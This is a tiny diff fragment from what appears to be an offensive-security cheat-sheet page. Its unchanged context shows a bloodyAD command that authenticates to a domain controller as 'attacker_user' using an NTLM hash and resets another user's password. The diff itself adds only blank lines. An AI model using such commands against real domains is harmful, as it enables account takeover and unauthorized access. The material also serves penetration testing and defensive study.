@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:26:38.109512+00:00'
 ```bash
 bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B changePassword target_user target_newpwd
 ```
+
+
